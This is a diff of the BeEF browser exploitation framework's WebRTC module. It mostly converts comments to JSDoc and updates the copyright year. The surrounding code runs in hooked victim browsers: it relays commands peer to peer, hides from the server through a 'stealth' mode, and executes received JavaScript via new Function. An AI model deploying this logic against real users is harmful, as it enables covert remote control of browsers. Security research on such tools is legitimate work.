@@ -1,13 +1,11 @@
 //
-// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
 
 /**
- * @Literal object: beef.webrtc
- *
  * Manage the WebRTC peer to peer communication channels.
  * This objects contains all the necessary client-side WebRTC components,
  * allowing browsers to use WebRTC to communicate with each other.
@@ -19,21 +17,43 @@
  * the signalling.
  *
  * This is all mostly a Proof of Concept
+ * @namespace beef.webrtc
  */
 
-beefrtcs = {}; // To handle multiple peers - we need to have a hash of Beefwebrtc objects
-               // The key is the peer id
-globalrtc = {}; // To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
-                // these objects persist outside of everything else 
-                // The key is the peer id
-rtcstealth = false; // stealth should only be initiated from one peer - this global variable will contain:
-                    // false - i.e not stealthed; or
-                    // <peerid> - i.e. the id of the browser which initiated stealth mode
-rtcrecvchan = {}; // To handle multiple event channels - we need to have a global hash of these
-                  // The key is the peer id
+/** 
+ * To handle multiple peers - we need to have a hash of Beefwebrtc objects. The key is the peer id. 
+ * @memberof beef.webrtc
+*/
+beefrtcs = {};
+/** 
+ * To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
+ * these objects persist outside of everything else. The key is the peer id.
+ * @memberof beef.webrtc
+ */
+globalrtc = {}; 
+/** 
+ * stealth should only be initiated from one peer - this global variable will contain:
+ * false - i.e not stealthed; or
+ * <peerid> - i.e. the id of the browser which initiated stealth mode
+ * @memberof beef.webrtc
+ */
+rtcstealth = false; 
+/** 
+ * To handle multiple event channels - we need to have a global hash of these. The key is the peer id 
+ * @memberof beef.webrtc
+*/
+rtcrecvchan = {}; 
 
-// Beefwebrtc object - wraps everything together for a peer connection
-// One of these per peer connection, and will be stored in the beefrtc global hash
+/**
+ * Beefwebrtc object - wraps everything together for a peer connection
+ * One of these per peer connection, and will be stored in the beefrtc global hash
+ * @memberof beef.webrtc
+ * @param initiator 
+ * @param peer 
+ * @param turnjson 
+ * @param stunservers 
+ * @param verbparam 
+ */
 function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
     this.verbose = typeof verbparam !== 'undefined' ? verbparam : false; // whether this object is verbose or not
     this.initiator = typeof initiator !== 'undefined' ? initiator : 0; // if 1 - this is the caller; if 0 - this is the receiver
@@ -59,7 +79,10 @@ function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
                                     // ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]
 }
 
-// Initialize the object
+/**
+ * Initialize the object
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.initialize = function() {
   if (this.peerid == null) {
     return 0; // no peerid - NO DICE
@@ -88,8 +111,11 @@ Beefwebrtc.prototype.initialize = function() {
   return 1; // because .. yeah .. we had a peerid - this is good yar.
 }
 
-//Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
-//These values are now simply passed in from the config.yaml for the webrtc extension
+/** 
+ * Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
+ * These values are now simply passed in from the config.yaml for the webrtc extension
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.forceTurn = function(jason) {
     var turnServer = JSON.parse(jason);
     var iceServers = createIceServers(turnServer.uris,
@@ -103,7 +129,10 @@ Beefwebrtc.prototype.forceTurn = function(jason) {
     this.maybeStart();
 }
 
-// Try and establish the RTC connection
+/**
+ * Try and establish the RTC connection
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.createPeerConnection = function() {
   beef.debug('Creating RTCPeerConnnection with the following options:\n' +
             '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
@@ -129,7 +158,10 @@ Beefwebrtc.prototype.createPeerConnection = function() {
   this.dataChannel = globalrtc[this.peerid].createDataChannel("sendDataChannel", {reliable:false});
 }
 
-// When the PeerConnection receives a new ICE Candidate
+/** 
+ * When the PeerConnection receives a new ICE Candidate 
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onIceCandidate = function(event) {
   var peerid = null;
 
@@ -155,9 +187,12 @@ Beefwebrtc.prototype.onIceCandidate = function(event) {
   }
 }
 
-// For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
-// This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
-// against the message directly
+/**
+ * For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
+ * This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
+ * against the message directly
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.processMessage = function(message) {
   beef.debug('Signalling Message - S->C: ' + JSON.stringify(message));
   var msg = JSON.parse(message);
@@ -193,14 +228,20 @@ Beefwebrtc.prototype.processMessage = function(message) {
   } 
 }
 
-// Send a signalling message .. 
+/** 
+ * Send a signalling message ..
+ * @memberof beef.webrtc
+ */ 
 Beefwebrtc.prototype.sendSignalMsg = function(message) {
   var msgString = JSON.stringify(message);
   beef.debug('Signalling Message - C->S: ' + msgString);
   beef.net.send('/rtcsignal',0,{targetbeefid: this.peerid, signal: msgString});
 }
 
-// Used to record ICS candidates locally
+/**
+ * Used to record ICS candidates locally
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
   if (this.gatheredIceCandidateTypes[location][type])
     return;
@@ -208,12 +249,19 @@ Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
   // updateInfoDiv();
 }
 
-// When the signalling state changes. We don't actually do anything with this except log it.
+
+/**
+ * When the signalling state changes. We don't actually do anything with this except log it.
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
   beef.debug("Signalling has changed to: " + event.target.signalingState);
 }
 
-// When the ICE Connection State changes - this is useful to determine connection statuses with peers.
+/**
+ * When the ICE Connection State changes - this is useful to determine connection statuses with peers.
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
   var peerid = null;
 
@@ -259,7 +307,10 @@ Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
 
 }
 
-// This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
+/**
+ * This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.goStealth = function() {
     //stop the beef updater
     rtcstealth = this.peerid; // this is a global variable
@@ -269,7 +320,10 @@ Beefwebrtc.prototype.goStealth = function() {
     setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
 }
 
-// This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
+/**
+ * This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
+ * @memberof beef.webrtc
+ */
 rtcpollPeer = function() {
     if (rtcstealth == false) {
         //my peer has disabled stealth mode
@@ -284,7 +338,10 @@ rtcpollPeer = function() {
     setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
 }
 
-// When a data channel has been established - within here is the message handling function as well
+/** 
+ * When a data channel has been established - within here is the message handling function as well
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onDataChannel = function(event) {
   var peerid = null;
   for (k in globalrtc) {
@@ -351,20 +408,29 @@ Beefwebrtc.prototype.onDataChannel = function(event) {
   } 
 }
 
-// How the browser executes received JS (this is pretty hacky)
+/**
+ * How the browser executes received JS (this is pretty hacky)
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.execCmd = function(input) {
   var fn = new Function(input);
   var res = fn();
   return res.toString();
 }
 
-// Shortcut function to SEND a data messsage
+/**
+ * Shortcut function to SEND a data messsage
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.sendPeerMsg = function(msg) {
   beef.debug('sendPeerMsg to ' + this.peerid);
   this.dataChannel.send(msg);
 }
 
-// Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
+/**
+ * Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.maybeStart = function() {
   beef.debug("maybe starting ... ");
 
@@ -387,7 +453,10 @@ Beefwebrtc.prototype.maybeStart = function() {
   }
 }
 
-// RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
+/** 
+ * RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.doCall = function() {
   var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
   var self = this;
@@ -396,7 +465,10 @@ Beefwebrtc.prototype.doCall = function() {
              '  \'' + JSON.stringify(constraints) + '\'.');
 }
 
-// Helper method to merge SDP constraints
+/**
+ * Helper method to merge SDP constraints
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
   var merged = cons1;
   for (var name in cons2.mandatory) {
@@ -406,14 +478,13 @@ Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
   return merged;
 }
 
-// Sets the local RTC session description, sends this information back (via signalling)
-// The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
-// The receiver uses this information too - and vice-versa - hence the signaling
+/**
+ * Sets the local RTC session description, sends this information back (via signalling)
+ * The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
+ * The receiver uses this information too - and vice-versa - hence the signaling
+ * 
+ */
 Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
-  // This fucking function does NOT receive a 'this' state, and you can't pass additional parameters
-  // Stupid .. javascript :(
-  // So I'm hacking it to find the peerid gah - I believe *this* is what means you can't establish peers concurrently
-  // i.e. this browser will have to wait for this peerconnection to establish before attempting to connect to the next one..
   var peerid = null;
 
   for (var k in beefrtcs) {
@@ -435,17 +506,26 @@ Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
   }
 }
 
-// If the browser can't build an SDP
+/**
+ * If the browser can't build an SDP
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
   beef.debug('Failed to create session description: ' + error.toString());
 }
 
-// If the browser successfully sets a remote description
+/**
+ * If the browser successfully sets a remote description
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onSetRemoteDescriptionSuccess = function() {
   beef.debug('Set remote session description successfully');
 }
 
-// Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
+/**
+ * Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.calleeStart = function() {
   // Callee starts to process cached offer and other messages.
   while (this.msgQueue.length > 0) {
@@ -453,7 +533,10 @@ Beefwebrtc.prototype.calleeStart = function() {
   }
 }
 
-// Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
+/** 
+ * Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.processSignalingMessage = function(message) {
   if (!this.started) {
     beef.debug('peerConnection has not been created yet!');
@@ -522,19 +605,28 @@ Beefwebrtc.prototype.processSignalingMessage = function(message) {
   }
 }
 
-// Used to set the RTC remote session
+/**
+ * Used to set the RTC remote session
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.setRemote = function(message) {
     globalrtc[this.peerid].setRemoteDescription(new RTCSessionDescription(message),
        this.onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);
 }
 
-// As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
+/** 
+ * As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.doAnswer = function() {
   beef.debug('Sending answer to peer.');
   globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
 }
 
-// Helper method to determine what kind of ICE Candidate we've received
+/** 
+ * Helper method to determine what kind of ICE Candidate we've received
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
   if (candidateSDP.indexOf("typ relay ") >= 0)
     return "TURN";
@@ -545,17 +637,26 @@ Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
   return "UNKNOWN";
 }
 
-// Event handler for successful addition of ICE Candidates
+/**
+ * Event handler for successful addition of ICE Candidates
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
   beef.debug('AddIceCandidate success.');
 }
 
-// Event handler for unsuccessful addition of ICE Candidates
+/**
+ * Event handler for unsuccessful addition of ICE Candidates
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
   beef.debug('Failed to add Ice Candidate: ' + error.toString());
 }
 
-// If a peer hangs up (we bring down the peerconncetion via the stop() method)
+/** 
+ * If a peer hangs up (we bring down the peerconncetion via the stop() method)
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.onRemoteHangup = function() {
   beef.debug('Session terminated.');
   this.initiator = 0;
@@ -563,7 +664,10 @@ Beefwebrtc.prototype.onRemoteHangup = function() {
   this.stop();
 }
 
-// Bring down the peer connection
+/** 
+ * Bring down the peer connection
+ * @memberof beef.webrtc
+ */
 Beefwebrtc.prototype.stop = function() {
   this.started = false; // we're no longer started
   this.signalingReady = false; // signalling isn't ready
@@ -574,8 +678,11 @@ Beefwebrtc.prototype.stop = function() {
   this.allgood = false; // allgood .. NAH UH
 }
 
-// The actual beef.webrtc wrapper - this exposes only two functions directly - start, and status
-// These are the methods which are executed via the custom extension of the hook.js
+/**
+ * The actual beef.webrtc wrapper - this exposes only two functions directly - start, and status
+ * These are the methods which are executed via the custom extension of the hook.js
+ * @memberof beef.webrtc
+ */
 beef.webrtc = {
   // Start the RTCPeerConnection process
   start: function(initiator,peer,turnjson,stunservers,verbose) {
